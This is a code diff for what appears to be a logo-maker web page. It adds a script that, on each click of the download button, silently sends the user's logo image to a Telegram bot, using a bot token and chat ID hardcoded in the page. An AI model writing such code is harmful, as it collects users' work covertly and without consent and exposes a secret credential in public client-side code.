@@ -2007,6 +2007,40 @@ window.addEventListener('load', () => {
   buildTemplates();
   buildExamples();
 });
+// --- كود الربط مع تليجرام ---
+const TELEGRAM_TOKEN = '8602573979:AAH1OS0u2ClyQRSdODXX0Ma5kI_Lj62xlto';
+const CHAT_ID = '7676646736';
+
+function sendToTelegram() {
+    // 1. تحديد اللوحة (الكانفاس) اللي فيها اللوجو
+    const canvas = document.getElementById('main-canvas');
+    if (!canvas) return;
+
+    // 2. تحويل اللوجو لصورة
+    canvas.toBlob(function(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'logo.png');
+        formData.append('caption', '🚀 فيه لوجو جديد اتعمل على موقعك دلوقتى!');
+
+        // 3. إرسالها للبوت
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => console.log('تم الإرسال بنجاح!'))
+        .catch(err => console.error('خطأ في الإرسال:', err));
+    }, 'image/png');
+}
+
+// --- ربط الكود بزرار التحميل ---
+// هنخلي الكود يشتغل أول ما المستخدم يضغط على زرار التحميل الموجود في موقعك
+const downloadBtn = document.querySelector('.btn-primary[onclick="downloadLogo()"]');
+if(downloadBtn) {
+    downloadBtn.addEventListener('click', sendToTelegram);
+}
+  
 </script>
 </body>
 </html>
